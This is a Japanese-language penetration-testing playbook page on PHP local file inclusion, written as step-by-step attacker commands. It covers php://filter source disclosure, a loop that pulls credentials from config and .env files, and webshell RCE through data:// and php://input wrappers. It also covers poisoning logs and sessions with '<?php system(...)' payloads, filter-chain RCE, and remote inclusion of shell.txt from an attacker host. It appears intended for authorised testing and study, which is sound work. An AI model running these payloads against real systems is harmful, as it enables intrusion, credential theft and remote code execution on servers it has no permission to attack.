# LFI（ローカルファイルインクルージョン）

> **スコープ**: アプリが `include()` / `require()` 等でローカルファイルを**取り込んで実行コンテキストに乗せる**不備。検出と read/include の切り分け → `php://filter` ソース開示 → wrapper / log poisoning / session poisoning / filter chain による RCE 昇格 → RFI → 拡張子 append バイパスまで。純粋な「パス操作によるファイル読み取り」（実行を伴わない）は `Path_Traversal.md`。RCE 取得後のシェル定着は `Web_Shells.md`、取得した認証情報の処理は `../Credential_Discovery.md` を参照。

## 着火条件

- `?page=` / `?file=` / `?lang=` / `?template=` / `?include=` / `?view=` 等、**ページ名・ファイル名を受け取るパラメータ**がある
- そのパラメータ値が `include()` / `require()` / `include_once()` 系に渡っている疑い（値を変えるとページ全体の見た目が切り替わる・末尾に拡張子が補完される 404 メッセージが出る 等）
- `Path_Traversal.md` の手法で `/etc/passwd` 等は**読めたが**、PHP ファイルを指定するとソースが表示されず**実行されてしまう** → read ではなく include sink。LFI コンテキスト確定
- PHP 以外（JSP / ASP / Perl / Node の動的 `require`）でも include 不備は起きるが、**wrapper・log poisoning 等の RCE 道具が最も揃うのは PHP**。本ファイルは PHP を主対象に書く。**標的が PHP でない場合は末尾「他言語での file inclusion（PHP 以外）」で行き先を確認してから進む**

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `curl`（ペネトレ用 Linux ディストリ標準搭載）/ `nc`（log poisoning の UA 注入・標準搭載）/ `php_filter_chain_generator.py`（§6・synacktiv 製・GitHub clone 要・インターネットアクセス要）
- 外部リソース依存: filter chain generator は GitHub から clone する。**オフライン環境では §3〜§5（wrapper 直接 / log / session poisoning）を先に当たる**。filter chain は手動構築が非現実的なため generator が無いと実質使えない

## 先に確認すること

**(1) read か include かの切り分け（最初にやる）:** これが LFI と単純 traversal を分ける。`php://filter` でソースを base64 化して返せば「PHP として実行されず取り込まれている」＝ include sink が濃厚。生 PHP ソースがそのまま平文表示されるなら read（traversal）寄りで、RCE 化手法は効きにくい。

```bash
# [Attacker] include sink かどうかを base64 ソース開示で判定（実行を伴わないので痕跡を残さず読める）
curl -s "http://[TARGET]/index.php?page=php://filter/convert.base64-encode/resource=index"
# → base64 文字列が返る = include コンテキスト（実行されず filter を通過）。RCE 昇格(§3〜§6)へ進める
# → 生の <?php ... ?> が見える = ただの read。Path_Traversal.md 側の世界
```

**(2) `allow_url_include` の状態:** 直接は見えないので挙動で推定する。`data://` / `php://input`（§3）/ RFI（§7）が通れば On、全滅なら Off（現代の既定）。Off 前提で log/session poisoning（§4/§5）や filter chain（§6）を主力に据える。

**(3) 拡張子が末尾に付与されるか:** `?page=foo` が `foo.php` を探して `failed to open stream: .../foo.php` 等を出すなら append あり。§8 の append バイパスが必要になる。

**(4) LFI の射程＝Web プロセスユーザの読める範囲:** include/read は Web サーバプロセス（`apache` / `www-data` / サービス専用ユーザ等）の権限で動く。そのユーザが読めないファイル（`/root/` 配下 0700・`/etc/shadow` 0640 root:shadow・他ユーザの機微ファイル等）は取得できず**空が返る**（脆弱性が無いのではなく権限境界）。root 専有ファイルや root 所有の証跡を読みたいなら、LFI 単体では届かず**昇格・実ユーザ権限の取得が前提**。現実的な動線は「サービスユーザが読める設定ファイルから認証情報を抜く → 使い回し検証 → 実ユーザ/管理権限へ横展開」（`../Credential_Discovery.md`）。

**攻撃者の思考トレース:** まず `/etc/passwd` で LFI 成立を確認 → `php://filter` で `index.php` / `config.php` のソースを抜き、include の sink・DB 認証情報・他パラメータを把握 → RCE 経路を環境設定で選ぶ（`allow_url_include=On` なら §3 が最速、Off ならログ書込権限があれば §4/§5、何も書けなくても §6 filter chain は通ることが多い）。

---

## 1. LFI 検出と read/include 切り分け

**コマンド:**

```bash
# [Attacker] まず LFI 成立確認（traversal と同じく /etc/passwd）
curl -s --path-as-is "http://[TARGET]/index.php?page=../../../../etc/passwd"

# [Attacker] include sink 判定（php://filter で base64 ソース開示）
curl -s "http://[TARGET]/index.php?page=php://filter/convert.base64-encode/resource=index"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `/etc/passwd` の内容 + filter で base64 が返る | include sink 確定 | §2 でソース回収 → §3〜§6 で RCE 昇格 |
| `/etc/passwd` は読めるが filter は生ソース平文表示 | read（traversal）寄り | RCE 化は期待薄。`Path_Traversal.md` の読み取り路線へ |
| `failed to open stream: .../page.php` | 拡張子 `.php` が append されている | §8 append バイパス（`php://filter` は append 影響を受けにくいので §2 を先に試す）|
| `../` が正規化されて消える | curl / アプリが正規化 | `--path-as-is` を付ける。それでも消えるならエンコード（`Path_Traversal.md` §2）|

**注意:** `php://filter` の `resource=` には拡張子を付けない（`resource=index` で `index.php` を狙う）。アプリが `.php` を append する実装なら付けると二重になる。

---

## 2. php://filter によるソースコード開示（実行を伴わない）

include sink ではソースが実行されてしまうため平文で読めない。`convert.base64-encode` filter を噛ませると **PHP として解釈される前に base64 化**され、復号して読める。**RCE を起こさずソース・認証情報を抜けられる**のが利点で、実行コンテキストを汚さず痕跡も残らない。include の sink 部分や DB 接続文字列・API キーをここで把握してから §3 以降の RCE 昇格に進む。

**コマンド:**

```bash
# [Attacker] 主要ファイルを順に base64 開示 → デコード
for f in index config db database config/database settings .env; do
  echo "=== $f ==="
  curl -s "http://[TARGET]/index.php?page=php://filter/convert.base64-encode/resource=$f" \
    | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d 2>/dev/null
done
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `config.php` 等から DB 接続文字列・API キー | 設定ファイル漏洩 | 認証情報を抽出 → `../Credential_Discovery.md`。DB 認証情報は使い回し検証へ |
| include 部のソース（`include($_GET['page'].'.php')` 等）| sink と append 仕様が判明 | append あり → §8。include の前後に何が連結されるか把握 |
| base64 にならず空 / エラー | filter 非対応（PHP でない・filter 無効化）| §4 log poisoning / §6 filter chain は不可。read 路線へ |

**注意:** デコードは `base64 -d`。`zlib.deflate` を併用するアプリ（圧縮）なら `convert.base64-encode` 単体で空に見えることがある。その場合 `php://filter/zlib.inflate/...` を重ねる。

---

## 3. PHP wrapper による直接 RCE（data:// / php://input / expect://）

`allow_url_include=On`（既定 Off だが古い／設定ミス環境で On）なら、wrapper でコードを直接 include させて RCE。

**事前準備（必須・リバースシェル取得時）:** 受信用リスナーを別ウィンドウで起動し、テスター側到達可能 IP を確認する（`ip a` で全インターフェース確認）。詳細は `../../06_Concepts/Reverse_Shell.md`（攻撃側の準備①②）。

**コマンド:**

```bash
# [Attacker] data:// wrapper（allow_url_include=On 必須）
# payload: <?php system($_GET['c']); ?> を base64 化
curl -s "http://[TARGET]/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"

# [Attacker] php://input wrapper（POST ボディを PHP として実行・allow_url_include=On 必須）
curl -s "http://[TARGET]/index.php?page=php://input&c=id" \
  --data '<?php system($_GET["c"]); ?>'

# [Attacker] expect:// wrapper（expect 拡張が有効な稀な環境・コマンド直実行）
curl -s "http://[TARGET]/index.php?page=expect://id"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `uid=...` 等コマンド出力 | RCE 成立 | `&c=` をリバースシェル化 → `Web_Shells.md` / `../../06_Concepts/Reverse_Shell.md` |
| `data://` / `php://input` が無反応・空 | `allow_url_include=Off`（現代既定）| §4 log poisoning / §5 session poisoning / §6 filter chain へ |
| `expect://` が `failed to open stream` | expect 拡張未導入（ほとんどの環境）| 同上 |

**注意:** `allow_url_include=Off` が現代の既定。§3 が全滅でも LFI 自体は活きているので、**書込権限不要の §6 filter chain を本命**に切り替える。`data://` の base64 payload は最小 webshell（`<?php system($_GET['c']); ?>`）。実環境ではテスト識別子を付けたシェルにする。

---

## 4. ログポイズニング → RCE

**原理（1行）:** include 先に**自分が内容を制御できるログファイル**へ PHP コードを書き込み、そのログを `?page=` で include させて実行する。`allow_url_include` 不要。ログの読み取り・書き込み権限と正確なログパスが条件。

**対象ログと注入経路:**

| ログ | 典型パス（distro 依存）| 注入方法 |
|------|------------------------|----------|
| Apache access log | `/var/log/apache2/access.log` / `/var/log/httpd/access_log` | `User-Agent` ヘッダーに payload を入れて1回アクセス |
| Nginx access log | `/var/log/nginx/access.log` | 同上 |
| SSH auth log | `/var/log/auth.log` / `/var/log/secure` | **ユーザー名**に payload を入れて SSH 接続試行（`ssh '<?php ...?>'@[TARGET]`）|
| Mail log | `/var/log/mail` / `/var/mail/[USER]` | SMTP で payload 入りメール送信 |
| PHP-FPM / proc | `/proc/self/environ` | `User-Agent` 経由（新しめのカーネル／FPM 構成では反映されないことあり）|
| FTP log | `/var/log/vsftpd.log` | ユーザー名に payload を入れてログイン試行 |

**コマンド:**

```bash
# [Attacker] (1) access log に webshell を仕込む（UA に PHP を注入して1回アクセス）
curl -s "http://[TARGET]/" -A '<?php system($_GET["c"]); ?>'

# [Attacker] (2) そのログを include して実行
curl -s "http://[TARGET]/index.php?page=/var/log/apache2/access.log&c=id"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ログ末尾に混じって `uid=...` | poisoning 成功・RCE 成立 | `&c=` をリバースシェル化 → `Web_Shells.md` |
| ログは表示されるが payload が実行されない | UA がエスケープ／別形式で記録 | payload を `<?=` 短縮タグや別ヘッダー（Referer）に変える |
| ログ include が `Permission denied` / 空 | Web プロセスにログ読取権限なし／パス違い | パスを distro 別に総当たり。`/proc/self/fd/N`（開いている fd 経由）も試す |

**注意:** ログパスは distro / Web サーバで大きく変わる。`§2` で取得した設定ファイルや `/etc/apache2/` 配下の設定でログパスを確定させてから撃つと無駄打ちが減る。**ログ汚染は痕跡が残る** → 原状回復はログから該当行の手動削除が必要（実環境では記録しておく）。

---

## 5. PHP セッションファイルポイズニング → RCE

**原理:** アプリが**ユーザー制御可能な値をセッションに保存**している場合、そのセッションファイル（`/var/lib/php/sessions/sess_[PHPSESSID]`）に PHP コードが書き込まれる。これを include して実行する。ログ書込権限が無くてもセッションは自分のものなので通りやすい。

**コマンド:**

```bash
# [Attacker] (1) セッションに payload を保存させる
#   例: ユーザー名・言語設定など「セッションに残る入力欄」に <?php system($_GET['c']); ?> を入れる
#   PHPSESSID は cookie から確認
curl -s "http://[TARGET]/profile.php" -b "PHPSESSID=[PHPSESSID]" \
  --data 'username=<?php system($_GET["c"]); ?>'

# [Attacker] (2) セッションファイルを include
curl -s "http://[TARGET]/index.php?page=/var/lib/php/sessions/sess_[PHPSESSID]&c=id" \
  -b "PHPSESSID=[PHPSESSID]"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| セッション内容に混じって `uid=...` | RCE 成立 | リバースシェル化 → `Web_Shells.md` |
| セッションファイルが空／読めない | `session.save_path` が別場所 | `§2` で `php.ini` / `phpinfo` から save_path 確認。`/tmp/sess_*` も試す |
| 保存した値が見えない | 入力がセッションに残らない設計 | log poisoning（§4）/ filter chain（§6）へ |

**注意:** `session.save_path` 既定は `/var/lib/php/sessions/`（Debian系）だが `/tmp` の場合もある。PHPSESSID は cookie（`Set-Cookie`）から取得。値がサーバ側で sanitize されると payload が壊れる。

---

## 6. php://filter chain → RCE（モダン・ファイル書込不要）

**原理:** `php://filter` の変換 filter を**多段に連鎖**させると、`resource=` が指す空／任意ファイルから**任意のバイト列（PHP コード）を合成**でき、それがそのまま include されて実行される。`allow_url_include` 不要・ログ／セッション書込権限不要で、**LFI 単体から RCE に到達できる現代の主力**。手で組むのは非現実的なので generator を使う。

**事前準備（必須）:**

```bash
# [Attacker] generator を入手（インターネット要・オフライン時は §3〜§5 を使う）
git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit 2>/dev/null || \
  curl -sO https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/master/php_filter_chain_generator.py
```

**コマンド:**

```bash
# [Attacker] 実行したい PHP を chain 化（出力された長い php://filter/... 文字列を ?page= に渡す）
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# → 生成された "php://filter/convert.iconv...|...|/resource=php://temp" を URL エンコードして送る
curl -s "http://[TARGET]/index.php?page=[GENERATED_FILTER_CHAIN]&c=id"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ページ先頭に `uid=...` | filter chain RCE 成立 | リバースシェル化 → `Web_Shells.md` / `../../06_Concepts/Reverse_Shell.md` |
| 500 / メモリエラー | chain が長すぎ／PHP のメモリ制限 | payload を短くする（最小 webshell に）。POST で送れるなら GET 長制限を回避 |
| 何も実行されない | そもそも include sink でない（§1 で判定済みのはず）| §1 に戻って read/include を再確認 |

**注意:** chain 文字列は非常に長く `&` `=` を含むので **URL エンコードして渡す**。`allow_url_include` も書込権限も不要なのが強みで、ログ汚染のような痕跡を残さない（検知されにくい）。PHP 7 系以降が対象。

---

## 7. RFI（リモートファイルインクルージョン）

`allow_url_include=On`（かつ `allow_url_fopen=On`）なら、`?page=` に**外部 URL** を渡して攻撃者ホスト上のコードを include できる。既定 Off のため遭遇は稀だが、当たれば最短。

**事前準備（必須）:** 攻撃者側で payload を配信する HTTP サーバを起動（`python3 -m http.server 80`）。`ip a` でテスター側到達可能 IP を確認。

**コマンド:**

```bash
# [Attacker] 外部 URL を include（shell.txt に <?php system($_GET['c']); ?>）
curl -s "http://[TARGET]/index.php?page=http://[ATTACKER_IP]/shell.txt&c=id"

# [Attacker] 拡張子 .php が append される場合は ? や # で打ち切る（§8 と併用）
curl -s "http://[TARGET]/index.php?page=http://[ATTACKER_IP]/shell.txt%23&c=id"   # %23 = #

# [Attacker] Windows 標的なら SMB 経由（\\）も。ftp:// が通る実装もある
curl -s "http://[TARGET]/index.php?page=\\\\[ATTACKER_IP]\\share\\shell.php"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `uid=...` | RFI 成立 | リバースシェル化 → `Web_Shells.md` |
| 外部 URL が無視され空 | `allow_url_include=Off`（既定）| RFI は不可。§4〜§6 のローカル経路へ |
| `.php` が付与され `shell.txt.php` を取りに来る | append あり | 末尾を `?` / `%23`(#) で打ち切る（§8）|

**注意:** RFI は外部通信を起こす（攻撃者ホストへのアウトバウンド）。「URL を取りに行く」挙動は SSRF と表裏 → URL を内部 IP に向けると SSRF 化する。`SSRF.md` も参照。

---

## 8. 拡張子 append バイパス

アプリが `include($_GET['page'].'.php')` のように**末尾に拡張子を連結**する場合、任意ファイルに到達するには連結部分を無効化する。

| 手法 | ペイロード例 | 効く条件 |
|------|------------|----------|
| Null byte | `?page=/etc/passwd%00` | PHP 5.3.4 **未満**のみ（現代は不可・CVE-2006-7243 系で対処済み）|
| パス長切り詰め | `?page=/etc/passwd/././././...`（4096 超）| 古い PHP のパス正規化バグのみ。現代は不可 |
| クエリ／フラグメント打ち切り（RFI 時）| `?page=http://[ATTACKER]/shell.txt%23` | RFI（§7）成立時。append が URL 側でクエリ扱いになり無効化 |
| wrapper は append 影響を受けにくい | `php://filter/.../resource=index` | filter / data / php://input は末尾連結を回避できることが多い → **append 環境では §2/§3/§6 を優先** |

**注意:** Null byte / パス切り詰めは現代環境では**ほぼ不可**（「古いシステム向けの一手」）。append 環境では拡張子トリックに固執せず、append の影響を受けにくい **wrapper 系（§2 filter / §6 filter chain）を主力**にするのが速い。

---

## 刺さらなかったとき（全体）

| 症状 | 推定原因 | 次のアクション |
|------|----------|--------------|
| `php://filter` で生ソースが平文表示される | include sink でなく read | LFI ではなく traversal。`Path_Traversal.md` 側へ |
| `/etc/passwd` すら 404 / 空 | パス制限（特定ディレクトリ配下のみ）／そもそも include でない | `../` 段数を増減。`§2` で include 部ソースを取って前後の連結を確認 |
| `data://` / `php://input` / RFI が全滅 | `allow_url_include=Off`（現代既定）| ローカル経路（§4 log / §5 session / §6 filter chain）に切替。**§6 が最も汎用的** |
| log / session を include できない | Web プロセスに読取権限なし／パス違い | distro 別のパス総当たり。`/proc/self/fd/N`。最後は §6 filter chain（権限不要）|
| 拡張子 `.php` が必ず付く | append あり・null byte は現代不可 | wrapper（§2/§6）で回避。append の影響を受けない |

---

## 注意点・落とし穴

- **read（traversal）と include（LFI）を最初に切り分ける**（§1）。これを飛ばすと「読めるのに RCE 手法が全部不発」で時間を溶かす
- `allow_url_include=Off` が現代既定 → `data://` / RFI は不発が普通。**書込権限不要の §6 filter chain を本命に据える**
- log / session poisoning は**サーバに痕跡が残る**。実環境では汚染したログ行・セッションを原状回復対象として記録する
- filter chain 文字列は長大で `&`/`=` を含む → **URL エンコード必須**。GET 長制限に当たるなら POST 化
- **§2 のソース／設定ファイル開示は実行を伴わず痕跡を残さない**。§3〜§6 の RCE 昇格に進む前に、ここで include の sink・認証情報を固めておくと無駄撃ちが減る

---

## 他言語での file inclusion（PHP 以外）

LFI を「取り込んだファイルが**実行される**」脆弱性と捉えると、それがそのまま成立するのは **PHP の `include`/`require` が拡張子を問わず中身を PHP として実行する**仕様による。他言語は等価物が別カテゴリに散る（読み取り＝traversal / テンプレート実行＝SSTI / アップロード設置＝webshell）ため、本ファイルは PHP を主対象とし、ここでは**行き先だけ**を示す。フル PoC は各リンク先に置く。

| 言語/環境 | 取り込み機構 | 既定の帰結 | RCE 化の道筋 / 行き先 |
|---|---|---|---|
| **PHP** | `include` / `require` / `include_once` | **RCE** | 拡張子無視で実行（§1〜§8 が本題）|
| **Perl / CGI** | `require` / `do`、2 引数 `open` | RCE あり | `require $input` で Perl 実行。`open(FH, $input)` で先頭 `\|` を渡すとコマンド注入（古典 CGI）|
| **Node.js** | 動的 `require()`、`res.render(view名)` | 条件付き RCE | アップロードした `.js` を `require` させ実行。テンプレートエンジン経由は SSTI 側（`SSTI.md`）|
| **JSP / Java** | `<%@include%>`（静的）、`<jsp:include>`、JSTL `<c:import url>` | 多くは read / SSRF | include 先は基本 webapp 内。`c:import` の `url` は外部 fetch ＝ SSRF/RFI 的（`SSRF.md`）。RCE は別途 `.jsp` 設置や deserialization 経由 |
| **ASP classic** | `<!--#include file/virtual-->`（SSI）| read 寄り | 動的なユーザー指定は限定的 |
| **ASP.NET** | 動的な「入力をコードとして include」は稀 | read | `Server.MapPath` / traversal の file read が中心（`Path_Traversal.md`）|
| **Python** | `importlib` 等が user 制御になるのは稀 | read | traversal で read。RCE はテンプレート（SSTI）/ pickle 等の別経路 |

**行き先の振り分け（言語共通）:**

- 取り込んだファイルが**実行されず中身が見えるだけ** → パストラバーサル（`Path_Traversal.md`）
- **テンプレートエンジン**に式・テンプレート名が渡って評価される → SSTI（`SSTI.md`）
- アップロードしたファイルを **web root に設置して実行**（言語問わず webshell）→ `File_Upload.md` / `Web_Shells.md`

> この表は確立した文書からの引用ではなく分類としての整理。**PHP 以外で「include 実行」がフル威力で出るのは実質 Perl と Node 程度**で、JSP / .NET / Python は read（traversal）か SSTI に流れる、という経験則ベースの地図として使う。

---

## 関連技術
- 前：パスを受け取るパラメータの発見・バージョン特定 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：Web 脆弱性の分岐フロー → `../../00_Playbook/Web_Vuln_Flow.md`
- 関連：実行を伴わない純粋なファイル読み取り（read sink）→ `Path_Traversal.md`
- 後：RCE 取得後の webshell 設置・リバースシェル → `Web_Shells.md` / `../../06_Concepts/Reverse_Shell.md`
- 後：開示したソース／設定からの認証情報抽出 → `../Credential_Discovery.md`
- 後：取得したハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`
- 関連：RFI で外部 URL を取りに行く挙動（URL を内部に向けると SSRF 化）→ `SSRF.md`
- 関連：`phar://` / `zip://` wrapper と組み合わせる際のアップロード経路 → `File_Upload.md`
